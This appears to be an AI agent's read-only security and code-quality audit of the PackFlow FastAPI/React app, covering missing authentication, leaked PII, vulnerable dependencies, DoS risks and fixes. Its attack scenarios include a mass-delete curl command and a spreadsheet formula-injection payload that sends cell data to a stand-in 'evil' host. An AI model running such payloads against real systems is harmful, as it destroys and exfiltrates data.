# PackFlow: code-quality and security audit

- **Scope:** the working tree on branch `feat/postgres-migration` as of 2026-11-24, including about 40 uncommitted or untracked files.
- **Mode:** read-only. This file is the only one written in the repository. The previous `AUDIT_REPORT.md`, an untracked packing-algorithm comparison, was copied to the session scratchpad before it was replaced.
- **Labels:** **FACT** means read in the code or measured. **INFERENCE** means reasoned but not verified; these carry a confidence level.

---

## 1. Executive summary

PackFlow is a small, readable FastAPI + React app. Its SQL is parameterized, its PDF output is escaped, and it has a sizeable test suite. Its main weakness is operational security: the API has **no authentication at all**, and `render.yaml` deploys it as a public web service. Anyone with the URL can read about 1,200 client contact records and wipe every order with one request.

**Top 5 risks**
1. **S1:** no authentication or authorization on any endpoint, including bulk deletes and PII listings (Critical).
2. **S2:** a SQLite backup holding 1,203 client records and 4 original purchase-order PDFs is committed and pushed to `origin/main` (High).
3. **S3:** `pypdf 5.1.0` has 26 published advisories and `starlette 0.41.3` has 7. Both parse untrusted, unauthenticated input (High).
4. **R1:** the frontend no longer type-checks, so `npm run build`, and therefore the Docker build, fails on this branch (High).
5. **S4 + S5:** anonymous callers can exhaust memory and CPU, through an unbounded `quantity` and through unbounded or unprotected file parsing (Medium).

| Area | Score (1–5) |
|---|---|
| Security | **1** |
| Architecture | 3 |
| Readability | 3 |
| Reliability | 3 |
| Testing | 3 |

---

## 2. Architecture overview

| Aspect | Facts |
|---|---|
| Stack | Python 3.12 FastAPI 0.115 (`backend/app`) and a React 19 + Vite 6 + TypeScript SPA (`frontend/src`) |
| Entry points | Development: `app.main:app` (`.claude/launch.json`, `Dockerfile` `backend-dev`). Production: `app.web:app`, which mounts the built SPA at `/` after the API routes (`backend/app/web.py:18`) |
| Routes | About 60 endpoints in `backend/app/main.py`, plus `/api/client-requirements*` in `requirements_routes.py`. None take a dependency or check the caller |
| Data flow | A PDF upload, email text or manual form goes through `extraction.py` (pypdf, regex and lexicon) into `orders` and `order_items`. `_run_plan` (`main.py:449`) then calls `packing.pack_order` and `cost_search`, and stores the result in `packing_plans.result_json`. Pricing comes from `dhl_pricing` and static tariff JSON. Documents are rendered by ReportLab (`shipping_docs`, `labels`, `tsca`, `reports`) or openpyxl (`/export`) |
| Persistence | `db.py` adapts SQLite and PostgreSQL (psycopg pool) behind `?` placeholders. Each `with connect()` is one unit of work. Postgres runs numbered migrations under an advisory lock (`database.py:84-95`); SQLite uses additive `ALTER TABLE` (`database.py:104+`). Uploaded PDFs and generated reports are stored as BLOBs |
| Authentication | **None** (`README.md:105`: "Authentication, permissions ... have not been implemented") |
| External calls | Slack webhook or `chat.postMessage` on "Save & Finish" (`slack_notify.py`, 5 s timeout). Nothing else at runtime |
| Configuration | Environment variables: `DATABASE_URL`, `PACKFLOW_DB_PATH`, `PACKFLOW_SEED_REFERENCE_CATALOG`, `PACKFLOW_DB_POOL_MAX`, `SLACK_*`. `env.py` loads the project `.env` for local runs |
| Build and deploy | Multi-stage `Dockerfile`: the Node 22 stage builds the SPA, then the Python 3.12-slim runtime runs as a non-root user with a healthcheck and `uvicorn --workers 1`. `render.yaml` defines a free Render web service in Frankfurt; `DATABASE_URL` is set in the dashboard. `compose.postgres.yml` is a local Postgres override. CI exists at `.github/workflows/backend-tests.yml` but is **untracked** |

**Covered:** every backend module under `backend/app` (main.py read in full; the other modules read where they touch input, SQL, files, PDFs or network); the schema; Docker, Render, Compose and CI configuration; git history for secrets and data files; the frontend's API client, Vite config and risky DOM APIs.
**Not covered:** line-by-line correctness of the packing and cost algorithms (`packing.py`, `cost_search.py`) and of the extraction heuristics, which the earlier audit covered; frontend component UX and full accessibility; the live Render deployment, which was not contacted.

---

## 3. Findings table

| ID | Area | Severity | Location | Title |
|---|---|---|---|---|
| S1 | Security (A01/A07) | **Critical** | `backend/app/main.py:559-571` and all routes | No authentication or authorization on any endpoint |
| S2 | Security (A02/data exposure) | **High** | `backend/data/packflow.backup.db~` (commit `a43976e`), `.gitignore:7` | Database with client PII and PO PDFs committed and pushed |
| S3 | Security (A06) | **High** | `backend/requirements.txt:4,1` | Vulnerable pypdf 5.1.0 and starlette 0.41.3 parse untrusted input |
| R1 | Reliability / Build | **High** | `frontend/src/components/ProductCombobox.tsx:12`, `frontend/src/manualOrder.ts:43` | Frontend type errors break `npm run build` and the Docker image |
| S4 | Security (DoS) | Medium | `backend/app/main.py:85`, `backend/app/packing.py:386` | Unbounded `quantity` lets one request allocate millions of objects |
| S5 | Security (DoS / A05) | Medium | `backend/app/main.py:689-691,1745,1808`, `requirements_routes.py:116`, `extraction.py:950,1174` | Uploads read fully before the size check; xlsx has no limit and no XML-bomb protection |
| S6 | Security (A03) | Medium | `backend/app/main.py:1356-1365,1413-1418` | Formula injection in the XLSX export |
| A1 | Reliability / Performance | Medium | `backend/app/main.py:686-767,1740,1805`, `requirements_routes.py:113` | CPU and DB work inside `async def` blocks the only event loop |
| A2 | Performance | Medium | `backend/app/main.py:1447-1468` | Stored PO PDF is re-parsed on every plan, quote, document and TSCA call |
| A3 | Performance | Medium | `backend/app/main.py:216-238,279-287,1772-1773` | Per-item full catalog scan (N+1) on every analyze and import |
| R2 | Reliability | Medium | `backend/app/main.py:1746`, `extraction.py:950,1174` | Corrupt xlsx on catalog import returns an unhandled 500 |
| R3 | Testing | Medium | `backend/tests/test_ux_contracts.py:104`, `backend/tests/test_slack_notify.py:28` | Two backend tests fail (one error, one stale assertion) |
| T1 | Testing / CI | Medium | `.github/workflows/backend-tests.yml` (untracked) | CI is not committed and has no frontend job |
| S7 | Security (A05) | Low | `backend/app/main.py` (no header middleware) | No CSP, X-Frame-Options or other security headers |
| S8 | Security (A09) | Low | `backend/app/main.py:1763,1771,1791`, `extraction.py:1048` | Raw exception text returned to clients |
| A4 | Reliability | Low | `backend/app/cost_search.py:196-204` | Process-wide `sys.setrecursionlimit` changed per request from worker threads |
| A5 | Reliability | Low | `backend/app/main.py:740-758,800-803` | Check-then-insert on `order_number` returns 500 on a race |
| A6 | Architecture | Low | `backend/app/main.py` (1,893 lines) | God module mixes routes, matching heuristics, exports and TSCA |
| A7 | Database | Low | `backend/app/main.py:516-531` | `packing_plans` grows by a full JSON snapshot on every analyze |
| D1 | Dependencies | Low | `backend/requirements.txt`, `backend/venv` | Transitive Python dependencies unpinned; local venv drifts from requirements |
| C1 | Infrastructure | Low | `compose.postgres.yml:12,27` | Default database password `packflow` |
| T2 | Developer experience | Low | repository root | No Python lint or type-check configuration |
| I1 | Infrastructure | Info | `Dockerfile` (CMD), `--forwarded-allow-ips='*'` | Client IP can be spoofed if later used for rate limits or logs |

---

## 4. Detailed findings

### S1: No authentication or authorization (Critical)

**FACT.** No route declares a dependency, and there is no middleware or token check anywhere (`grep -i "auth|token|Depends|session|cookie"` over `backend/app` finds only PDF and tokenizer code).

```python
# backend/app/main.py:559-571
app = FastAPI(title="PackFlow API", ...)
app.add_middleware(CORSMiddleware, allow_origins=["http://localhost:5173", ...], ...)
app.include_router(requirements_router)
```
```python
# backend/app/main.py:636-643
@app.delete("/api/orders")
def delete_all_orders() -> dict[str, int]:
    with connect() as db:
        count = db.execute("SELECT COUNT(*) FROM orders").fetchone()[0]
        db.execute("DELETE FROM orders")
```
Other reachable operations include:
- `GET /api/clients` (`:1797`): names, emails, phones and addresses.
- `DELETE /api/clients` (`:1880`).
- `GET /api/orders/{id}/source.pdf` (`:907`): sequential integer IDs, so every customer PO can be enumerated.
- `PUT /api/settings/exporter` (`:1123`): changes the company identity printed on shipping and TSCA documents.
- Slack posts (`:1069`).

**Deployment context.** **FACT:** `render.yaml` defines `type: web`, `plan: free`, and the README states authentication is not implemented. **INFERENCE (confidence High):** Render web services are public by default, so the API is internet-reachable unless something outside this repository restricts it.

**Scenario.** Anyone who learns the `*.onrender.com` URL (shared links, referrer headers, scanners) runs `curl -X DELETE https://…/api/orders` and `…/api/clients`. That wipes the database and exfiltrates the client list first. CORS does not help: it only limits browsers, not curl.

**Fix.** Pick one, depending on the audience:
- **Fastest (internal tool):** put the service behind an identity-aware proxy, such as Cloudflare Access or Render private service plus a gateway, and keep the app unchanged.
- **In-app:** a global dependency that checks a shared secret or session, applied to every `/api/*` route except `/api/health`.
```python
# app/security.py
import hmac, os
from fastapi import Header, HTTPException
def require_api_key(x_api_key: str = Header(default="")) -> None:
    expected = os.environ.get("PACKFLOW_API_KEY", "")
    if not expected or not hmac.compare_digest(x_api_key, expected):
        raise HTTPException(401, "Unauthorized")
# main.py
app = FastAPI(..., dependencies=[Depends(require_api_key)])  # health exempted via separate router
```
A static key in a browser SPA is weak. For real users, use session-cookie login with hashed passwords (argon2), `SameSite=Lax` and `Secure` cookies, plus CSRF protection on state-changing routes, and roles so that bulk deletes are admin-only. Add rate limiting on uploads.

**Effort:** M for the in-app version, S for the proxy. **Risk:** Medium, because every frontend `fetch` must send credentials and tests that call routes over HTTP need a key. **Tests:** add a 401 test per router.

---

### S2: Database with client PII committed and pushed (High)

**FACT.** `backend/data/packflow.backup.db~` is tracked: it was added in `a43976e` and is contained in `main`, `develop` and `remotes/origin/main`. `.gitignore` excludes only `backend/data/*.db`, and the trailing `~` escapes that pattern. A read-only inspection of the file found:

| Table | Rows | Sensitive columns |
|---|---|---|
| clients | 1,203 | customer, contact_name, email, phone_number, address, shipping_address |
| source_documents | 4 | full original PO PDFs |
| client_requirements | 56 | invoice_email, payment, pricing_requirements |
| orders / analysis_reports | 5 / 5 | addresses, totals, PDF reports |

No values were printed. Five more `.db` snapshots sit in `backend/data/` but are correctly ignored.

**INFERENCE.** Whether this is a leak depends on the visibility of `github.com/kev-3d/t3d-packflow`, which was not checked because the audit contacted no external services. Everyone with clone access has the data either way.

**Fix.**
1. `git rm --cached "backend/data/packflow.backup.db~"`.
2. Replace the ignore rule with `backend/data/`.
3. If the repository was ever public or shared beyond the owners, purge the file from history with `git filter-repo --path backend/data/packflow.backup.db~ --invert-paths` and a coordinated force push, then evaluate GDPR breach-notification obligations, since the records include EU contacts.

**Effort:** S to untrack, M to rewrite history. **Risk:** a history rewrite changes every commit SHA, so collaborators must re-clone.

---

### S3: Vulnerable pypdf and starlette (High)

**FACT** (from `pip-audit -r backend/requirements.txt`):
- `pypdf==5.1.0` has 26 advisories (for example CVE-2026-119203…119209, CVE-2026-113786…113795, PYSEC-2026-4154…4160). Every fix requires **pypdf ≥ 6.21.4**.
- `starlette==0.41.3`, pulled in by `fastapi==0.115.6`, has 7 advisories (PYSEC-2026-1941, -1942, -161, -2280, -2281, -248, -249). Every fix requires **starlette ≥ 1.3.1**.
- `python-multipart`, `openpyxl`, `reportlab`, `uvicorn` and `psycopg`: none reported.
- `npm audit` for the frontend: 0 vulnerabilities, production and development.

Advisory descriptions were not downloaded (`--desc off`). **INFERENCE (Medium):** pypdf advisories are historically mostly denial of service from crafted PDFs (infinite loops, memory blow-up). That is directly reachable here: `POST /api/orders/upload` passes unauthenticated bytes to `PdfReader` (`extraction.py:803`), and `_pdf_text` re-parses the stored PDF repeatedly (A2). The starlette advisories affect request parsing and multipart handling, which every request uses.

**Fix.** Raise `pypdf` to ≥ 6.21.4. Upgrade FastAPI to a release that allows starlette ≥ 1.3.1, then rerun the full suite. Test the pypdf 5 → 6 jump against the real PO fixtures, because text-extraction layout can change between major versions.

**Effort:** M. **Risk:** Medium, because PO extraction may regress. Run `test_extraction.py` and the real-PDF fixtures.

---

### R1: Frontend build broken on this branch (High)

**FACT.** `npx tsc -b`:
```
src/components/ProductCombobox.tsx(12,45): error TS2339: Property 'price_eur' does not exist on type 'Product'.
src/components/ProductCombobox.tsx(12,76): error TS2339: ...
src/manualOrder.ts(43,68): error TS2339: ...
```
The uncommitted diff of `frontend/src/types.ts` removes `price_eur: number` (it was at HEAD line 181), but two callers still read it. `package.json` defines `"build": "tsc -b && vite build"`, and the `frontend-build` stage of the `Dockerfile` runs `npm run build`, so **INFERENCE (High):** a Render deploy of this branch fails at image build.

**Fix.** Remove the `price_eur` reads, or restore the field if the backend still sends it. Add a frontend CI job (T1).

**Effort:** S. **Risk:** Low.

---

### S4: Unbounded quantity causes memory and CPU exhaustion (Medium)

**FACT.**
```python
# main.py:85
quantity: int = Field(gt=0)            # no upper bound
# packing.py:386
for index in range(int(item["quantity"])):
    units.append(Unit(...))            # one object per unit
```
`POST /api/orders/manual` with `quantity: 50000000`, followed by `POST /api/orders/{id}/analyze`, allocates tens of millions of dataclass objects and then runs the packing heuristics over them. With `--workers 1` and the 512 MB free Render instance, that is an out-of-memory kill or a hang for everyone. PDF-extracted quantities (`extraction.py:712`) have no cap either. (`SuggestedItemPayload` correctly uses `le=100`.)

**Fix.** Set `quantity: int = Field(gt=0, le=10_000)`, or a business maximum. Also enforce a cap on total units per order in `_run_plan` before `pack_order`, and clamp extracted quantities.

**Effort:** S. **Risk:** Low. Real orders above the cap would be rejected, so choose the limit with the business.

---

### S5: Upload limits and parser hardening (Medium)

**FACT.**
```python
# main.py:689-691
content = await file.read()                 # whole body in memory first
if len(content) > 15 * 1024 * 1024:         # checked afterwards
# main.py:1745 / 1808, requirements_routes.py:116
content = await file.read()                 # no size check at all
```
- `load_workbook(...)` runs on the uploaded bytes (`extraction.py:950,1046,1174`, `requirements.py:145`), and `defusedxml` is not installed. openpyxl's documentation states that it does not guard against quadratic-blowup or billion-laughs XML without `defusedxml`.
- An `.xlsx` is a ZIP archive, so a small upload can decompress to gigabytes.
- The only validation is the filename extension (`main.py:687,1743`).

**Fix.**
1. Reject requests early on `Content-Length`, at the proxy or with a middleware.
2. Read in bounded chunks: `content = await file.read(LIMIT + 1)`, then reject if `len(content) > LIMIT`.
3. Add `defusedxml` to `requirements.txt`; openpyxl picks it up automatically.
4. Before parsing, check the uncompressed size of the ZIP (`zipfile.ZipFile(...).infolist()`, total `file_size` below about 50 MB).
5. Check the magic bytes (`%PDF-`, `PK\x03\x04`).

**Effort:** S. **Risk:** Low.

---

### S6: Formula injection in the XLSX export (Medium)

**FACT.** openpyxl stores any string that starts with `=` as a formula: an appended `'=HYPERLINK("http://x","a")'` gets `data_type == 'f'`, verified in the project venv. `export_order` writes values that come from uploaded PDFs, email text or API callers straight into cells:
```python
# main.py:1358-1364
summary.append(["Customer", order["client"]])
summary.append(["Terms", order["terms"]])
summary.append(["Delivery address", order["delivery_address"]])
# main.py:1414  contents.append([box["sequence"], item["name"], ...])
```
**Scenario.** A supplier PO, or an anonymous API call (see S1), sets `client` to `=HYPERLINK("https://evil/?d="&B9,"Click")` or a DDE payload. Staff open `plan-XXX.xlsx` in Excel, and the formula runs or leaks adjacent cell data when clicked.

**Fix.** Neutralize leading formula characters when writing text cells:
```python
def _cell(v):
    return "'" + v if isinstance(v, str) and v[:1] in ("=", "+", "-", "@", "\t", "\r") else v
```
Alternatively, set `cell.data_type = "s"` after assignment. Add a unit test.

**Effort:** S. **Risk:** Low. A text value that legitimately starts with `-` or `+` would show the leading apostrophe-escape in Excel.

---

### A1: Blocking work in `async def` endpoints (Medium)

**FACT.** `upload_order` is `async def` (`main.py:686`). It calls `extract_pdf` (pypdf parsing and regex) and runs synchronous SQLite or psycopg I/O (`:696-766`) directly on the event loop. `import_catalog` (`:1740`), `import_clients` (`:1805`) and `import_client_requirements` (`requirements_routes.py:113`) do the same with openpyxl. Production runs `--workers 1` (`Dockerfile`, last line).

**Impact.** While one large PDF or workbook is parsed, every other request stalls, including `/api/health`, which can make Render restart the instance.

**Fix.** Declare these as plain `def` and read with `file.file.read(LIMIT + 1)`. FastAPI then runs them in its threadpool, as it already does for every other route. **Effort:** S. **Risk:** Low.

---

### A2: PO PDF re-parsed on many calls (Medium)

**FACT.**
```python
# main.py:1452-1459
document = db.execute("SELECT content FROM source_documents WHERE order_id = ?", ...).fetchone()
sources = [..., ("PO document", _pdf_text(document["content"]) if document else ""), ...]
```
`_detect_order_destination` runs a full pypdf text extraction each time. It is reached from:
- `_packing_zone` (`:400`), on every analyze, and also on every recommendation preview (`:983`)
- `GET /shipping-quote` (`:1498`)
- `_shipment_for` (`:1141`), for packing-list and labels PDFs
- `_order_destination`, through `_tsca_state` (`:1231`), which runs twice per `PUT /tsca` (`:1283,1301`) and once per TSCA preview or export

**Fix.** Store the extracted text, or the detected destination, at upload time in a `source_documents.text` column, and read that. **Effort:** S–M (migration for both engines). **Risk:** Low.

---

### A3: N+1 catalog scans in product matching (Medium)

**FACT.** `_relink_order_items` (`:279-287`) calls `_find_product_by_description` once per order line. Each call runs `SELECT id, name FROM products` and normalizes every name up to three times (`:222-238`, plus the fuzzy `SequenceMatcher` pass at `:270-274`). The relink runs on every `_run_plan` (`:460`). On a reference-workbook import it runs for **every order** (`:1772-1773`), so the cost is orders × lines × products.

**Fix.** Load and normalize the products once per request, `{normalized_name: row}`, and pass that into the matcher. **Effort:** S. **Risk:** Low, but keep `test_product_matching.py` green.

---

### R2: Corrupt workbook on catalog import returns 500 (Medium)

**FACT.** `import_catalog` calls `parse_reference_workbook(content)` (`main.py:1746`). That function, and `parse_catalog_excel` (`extraction.py:950,1174`), call `load_workbook` without a `try`. A non-ZIP or corrupt file uploaded as `x.xlsx` therefore raises an unhandled exception: HTTP 500 with a server-side traceback. The clients and requirements imports already handle this (`extraction.py:1045-1048`), so the code is inconsistent.

**Fix.** Wrap both parsers like `parse_clients_excel`, and return a 400 with a generic message. **Effort:** S. **Risk:** Low.

---

### R3: Failing backend tests (Medium)

**FACT.** `python -m unittest discover -s tests` on SQLite: **179 run, 1 failure, 1 error, 5 skipped**.
- `test_ux_contracts…test_preview_is_read_only_and_matches_apply_with_partial_undo` raises `HTTPException 409: The catalog changed` from `main.py:991`. **INFERENCE (Medium):** this was introduced by the uncommitted `main.py` and `packing.py` changes. The second preview of the same addition gives a different box list, so either preview is no longer read-only or packing is no longer deterministic. This could be a real user-facing bug ("Recalculate" loop), not just a test problem.
- `test_slack_notify…test_message_contains_ready_status_and_packing_list` expects `"81.2%"`, but `build_message` (`slack_notify.py:42-69`) never includes utilization. Both files are unchanged since `a43976e`, so this failure already exists at HEAD.

**Fix.** Investigate the 409 before merging this branch. Fix whichever side is wrong for the Slack test: the message or the assertion. **Effort:** S–M. **Risk:** Low.

---

### T1: CI not committed and backend-only (Medium)

**FACT.** `git status` shows `?? .github/`, so the workflow has never run on GitHub. `backend-tests.yml` runs only `unittest` (SQLite and Postgres matrix). It has no `npm run lint`, `npm test` or `npm run build`, so R1 would pass CI even once committed.

**Fix.** Commit the workflow and add a `frontend` job: `npm ci && npm run lint && npm test && npm run build`. Optionally add a `docker build` job and `pip-audit` / `npm audit` steps. **Effort:** S. **Risk:** none.

---

### S7: No security headers (Low)

**FACT.** No middleware sets `Content-Security-Policy`, `X-Frame-Options` / `frame-ancestors`, `Referrer-Policy` or `Strict-Transport-Security`. Only `source.pdf` sets `nosniff` (`main.py:915`). The SPA performs destructive actions on click (delete all orders or clients), which makes clickjacking relevant once authentication exists.

**Fix.** Add a small middleware with `frame-ancestors 'none'`, `default-src 'self'`, `img-src 'self' data: blob: https://*.tile.openstreetmap.org` (Leaflet; adjust as needed), `object-src 'none'`, `Referrer-Policy: same-origin` and `X-Content-Type-Options: nosniff`. **Effort:** S. **Risk:** Medium, because a strict CSP can break Leaflet tiles or inline styles. Test in a browser.

### S8: Internal errors echoed to clients (Low)

**FACT.**
- `errors.append(f"Could not import {record}: {exc}")` (`main.py:1791`; also `:1763,1771`) returns raw database driver messages, which include constraint and table names.
- `extraction.py:1048` returns the openpyxl exception text.

**Fix.** Log `exc` server-side and return a generic message per row. **Effort:** S. **Risk:** none.

### A4: Global recursion limit changed per request (Low)

**FACT.**
```python
# cost_search.py:196-204
recursion = sys.getrecursionlimit()
sys.setrecursionlimit(max(recursion, 10000))
...
sys.setrecursionlimit(recursion)
```
Sync routes run in a threadpool, so two concurrent cost searches race on a process-global setting. **INFERENCE (Low):** a recursion depth near 10,000 on a worker thread can overflow the native thread stack and crash the process instead of raising `RecursionError`.

**Fix.** Make the memoized walk iterative (explicit stack), or bound the depth by the existing `SearchLimits`. **Effort:** M. **Risk:** Medium, because the algorithm changes. Keep `test_packing.py` and `test_wall_clearance.py` green.

### A5: `order_number` race returns 500 (Low)

**FACT.** `upload_order` loops `SELECT 1 … WHERE order_number = ?` and then inserts (`:742-758`). `_create_order` checks and then inserts (`:800-819`) without catching `IntegrityError`. The column is `UNIQUE` (`schema/sqlite.sql:36`), so data stays consistent, but two concurrent uploads of the same PO produce an unhandled 500. **Fix:** catch `IntegrityError` and retry with the next suffix, or return 409. **Effort:** S.

### A6: `main.py` is a 1,893-line god module (Low)

**FACT.** `main.py` contains:
- Pydantic models (`:51-137`)
- product-matching heuristics (`:147-276`)
- the planning orchestration (`:449-536`)
- about 50 routes
- an inline 90-line openpyxl export (`:1344-1435`)
- TSCA models and routes (`:1190-1341`)
- shipment assembly (`:1132-1161`)

Sanitization is also repeated three times: `_safe_number` at `:1164`, an inline copy at `:1055`, and a third variant at `:1430`. There are also two variant lists: `_PRODUCT_VARIANTS` at `:156-158` and `variants` at `:268`. `requirements_routes.py` already shows the router pattern.

**Fix.** Split incrementally into `routers/orders.py`, `catalog.py`, `clients.py`, `documents.py`, `tsca.py`, plus `services/product_matching.py`. Move one router per commit, with no behavior change. **Effort:** L. **Risk:** Medium (import cycles, test patches on `app.main.*`).

### A7: Unbounded plan history (Low)

**FACT.** Every `analyze`, suggestion add and suggestion remove inserts a new `packing_plans` row holding the full `result_json` (`:516-531`). Only `review_order` deletes old ones (`:888`), and only `latest_plan` is read. **Fix:** keep the plans referenced by `analysis_reports` and `shipping_quotes` plus the latest one, and delete the rest after insert. **Effort:** S.

### D1: Python dependency pinning and venv drift (Low)

**FACT.**
- `requirements.txt` pins only top-level packages. starlette, pydantic, anyio and others float within FastAPI's ranges, with no lockfile or hashes.
- The local `backend/venv` has `psycopg 3.2.13` and `psycopg-pool 3.2.8`, while requirements pin `3.3.9` and `3.3.3`. Local test results therefore do not reflect the pinned set.
- `.mcp.json` runs `npx shadcn@latest`, which is unpinned. It is developer tooling only.

**Fix.** Use `pip-compile --generate-hashes` (pip-tools) or `uv lock`, and rebuild the venv. **Effort:** S.

### C1: Default database password in Compose (Low)

**FACT.** `POSTGRES_PASSWORD: "${POSTGRES_PASSWORD:-packflow}"` (`compose.postgres.yml:12`), and the port is bound to `127.0.0.1` (`:17`). Exposure is local-only. **Fix:** use `${POSTGRES_PASSWORD:?set POSTGRES_PASSWORD}` so it fails when unset. **Effort:** S.

### T2: No Python lint or type-check (Low)

**FACT.** There is no `pyproject.toml`, `ruff.toml`, `setup.cfg` or mypy configuration. Frontend "lint" is only `tsc`. **Fix:** add `ruff` with `S` (bandit), `B` and `E` rules plus `mypy --strict` on `db.py`, and wire both into CI. **Effort:** S–M.

### I1: Trusting every proxy (Info)

**FACT.** The production command uses `--proxy-headers --forwarded-allow-ips='*'`. This is fine behind Render's proxy. If rate limiting or audit logging by client IP is added, `X-Forwarded-For` becomes spoofable by anyone who can reach the container directly.

---

## 5. What is done well (keep this when refactoring)

- **Parameterized SQL throughout.** The only f-string SQL interpolates constant column lists (`requirements_routes.py:19-20`), `?` placeholder counts (`main.py:1239`) or a regex-validated schema name (`db.py:247`). The `?`→`%s` translator handles literals and `%` (`db.py:91-106`).
- **PDF output is escaped.** Every user value goes through `xml.sax.saxutils.escape` before entering a ReportLab `Paragraph` (`shipping_docs.py:199,343`, `reports.py:30`, `tsca.py:296,335`). This prevents markup and `<img src>` injection.
- **Filenames in `Content-Disposition` are sanitized** (`main.py:913,1055,1164`).
- **Transactions.** `with connect()` commits or rolls back. Savepoints keep bulk imports going after a bad row on both engines (`db.py:155-166`). Previews use `SAVEPOINT … ROLLBACK TO` (`main.py:980-987`). Postgres migrations take an advisory lock (`database.py:84`).
- **Container hygiene.** The Dockerfile is multi-stage, runs as non-root (`useradd --uid 10001`), has a healthcheck, and `.dockerignore` excludes `.env`, data and tests.
- **Secrets.** `.env` (which holds the Slack webhook) is gitignored and **not** in any commit. Slack failures are caught, logged without the URL and never block saving (`slack_notify.py:83-91`).
- **Bounded search.** `cost_search` has explicit work limits and reports when it hit them (`cost_search.py:36,161-208`).
- **Validation and tests.** Many payloads carry Pydantic length and range limits (`ClientPayload`, `TscaDraftPayload`, `SuggestedItemPayload.le=100`). The backend has 179 tests with a SQLite/Postgres matrix, and the frontend has 53 tests. `npm audit` is clean.
- **Frontend.** No client-side secrets, same-origin `/api` calls, and `rel="noreferrer"` on `target="_blank"`. The one `dangerouslySetInnerHTML` (`ui/chart.tsx:92`) renders static theme CSS from code-defined chart config, not user data.

---

## 6. Prioritized action plan

**Quick wins (< 1 h each)**
1. S2: untrack the backup database and fix `.gitignore` (history purge decided separately).
2. R1: fix the `price_eur` type errors.
3. S4: cap `quantity` and units per order.
4. S5: bounded reads, `defusedxml`, magic-byte check.
5. S6: neutralize formulas in the XLSX export.
6. A1: change the four upload routes from `async def` to `def`.
7. R2 and S8: wrap the workbook parsers; return generic error messages.
8. T1: commit CI and add the frontend job.
9. C1: require `POSTGRES_PASSWORD`.

**Short term (days)**
1. S1: authentication (proxy or in-app), plus rate limiting on uploads.
2. S3: upgrade pypdf to ≥ 6.21.4 and FastAPI/starlette to ≥ 1.3.1, with regression runs against the real PO fixtures.
3. R3: diagnose the preview 409 regression and fix the Slack test.
4. A2 and A3: cache PDF text and the normalized catalog.
5. S7: security headers. D1: lock dependencies.

**Long term**
1. A6: split `main.py` into routers and services.
2. A4: iterative cost search.
3. A7: plan-history retention.
4. T2: ruff and mypy in CI.
5. Roles and audit logging once authentication exists.

---

## 7. Coverage and limits

**Tools run (all read-only, outside the repository where they write anything)**

| Tool | Result |
|---|---|
| `python -m unittest discover -s tests` (SQLite, `PACKFLOW_DB_PATH` pointed at a scratch file) | 179 tests: 1 failure, 1 error, 5 skipped |
| `npx tsc -b` | 3 errors |
| `npm test` | 53/53 pass |
| `npm audit` (production and all) | 0 vulnerabilities |
| `npm outdated` | Minor versions only; Vite 6 → 8 and TypeScript 5.7 → 7 are major |
| `pip-audit -r backend/requirements.txt`, in a throw-away scratch venv | pypdf and starlette advisories listed above |
| `git log --all` scan for added `.env`, `.db`, key or credential files | Only `.env.example` and the backup DB |
| Read-only `sqlite3` (`mode=ro`) inspection of the tracked backup DB | Table names and row counts only |
| A one-line openpyxl check in the project venv | Confirmed the formula behavior (S6) |

**Not done**
- Contacting the Render deployment or GitHub, so internet exposure (S1) and repository visibility (S2) are inferred, not verified.
- Postgres-engine tests, which need a running database.
- Downloading the advisory descriptions, so their severity is inferred from package history.
- Dynamic testing or fuzzing of the PDF and xlsx parsers.
- Full accessibility review of the SPA.
- Detailed correctness of the packing and extraction heuristics.
- Checking whether S2's data also exists in other clones or forks.
